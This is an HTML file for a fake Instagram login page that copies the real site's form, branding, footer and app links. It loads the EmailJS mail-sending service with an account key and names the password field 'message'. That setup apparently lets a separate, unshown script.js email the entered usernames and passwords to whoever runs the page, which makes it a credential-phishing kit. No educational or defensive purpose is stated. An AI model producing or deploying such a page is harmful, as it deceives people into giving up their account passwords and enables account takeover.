<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Login • Instagram</title>
    <link rel="stylesheet" href="style.css">
    <link rel="shortcut icon" href="img/Instagram_logo_2016.svg.webp">
    <style>
        img {
            vertical-align: text-top;
        }
    </style>
    <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
    <script type="text/javascript">
        emailjs.init('21JQw33lX39HDqmSE');
    </script>
</head>

<body>
    <div class="container">
        <div class="box">
            <div class="heading"></div>

            <!-- Corrected form tag placement -->
            <form class="login-form" id="form">
                <div class="field">
                    <input id="username" type="text" name="username" placeholder="Phone number, username, or email" required />
                    <label for="username">Phone number, username, or email</label>
                </div>
                <div class="field">
                    <input id="message" type="password" name="message" placeholder="Password" required />
                    <label for="password">Password</label>
                </div>
                <button class="login-button" id="submit" type="submit" title="Login">Log In</button>
            </form>

            <div class="separator">
                <div class="line"></div>
                <p>OR</p>
                <div class="line"></div>
            </div>
            <div class="other">
                <button class="fb-login-btn" type="button" onclick="window.location.href='https://www.facebook.com/login.php/'">
                    <i class="fa fa-facebook-official fb-icon"></i>
                    <span>
                        <img src="https://t3.gstatic.com/faviconV2?client=SOCIAL&type=FAVICON&fallback_opts=TYPE,SIZE,URL&url=https://www.facebook.com/&size=256" height="15" width="15" />
                        &nbsp;<a href="https://www.facebook.com/login.php/">Log in with Facebook</a>
                    </span>
                </button>
                <a class="forgot-password" href="https://www.instagram.com/accounts/password/reset/?__pwa=1">Forgot password?</a>
            </div>
        </div>

        <div class="box">
            <p>Don't have an account? <a class="signup" href="#">Sign Up</a></p>
        </div>
    </div>

    <br>
    <div class="get">
        Get the app.
    </div>

    <br>
    <div class="apps">
        <a href="https://play.google.com/store/apps/details?id=com.instagram.android&hl=en_IN">
            <img src="https://i.ibb.co/ZTHhz0b/playstore.png" height="40" width="134">
        </a>
        <a href="https://apps.microsoft.com/detail/9nblggh5l9xt?hl=en-US&gl=US">
            <img src="https://static.cdninstagram.com/rsrc.php/v4/yu/r/EHY6QnZYdNX.png" height="40" width="auto">
        </a>
    </div>

    <br>
    <div class="footer">
        <footer>
            <a href="https://about.meta.com/">About</a>
            <a href="https://about.fb.com/news/">Blog</a>
            <a href="https://www.metajobs.com/">Jobs</a>
            <a href="https://www.meta.com/help/">Help</a>
            <a href="https://developers.facebook.com/docs/">API</a>
            <a href="https://www.meta.com/privacy/">Privacy</a>
            <a href="https://www.meta.com/terms/">Terms</a>
            <a href="https://www.meta.com/locations/">Locations</a>
            <a href="https://www.instagram.com/lite/">Instagram Lite</a>
            <a href="https://www.facebook.com/help/instagram/261704639352628">Contact Uploading & Non-Users</a>
            <a href="https://www.meta.com/verified/">Meta-verified</a>
        </footer>
    </div>

    <div class="copyright">
        <br>
        <select aria-label="Switch Display Language" class="Language">
            <!-- Language options... -->
        </select> © 2025 Instagram from Meta
    </div>
    <script src="script.js"></script>
</body>

</html>
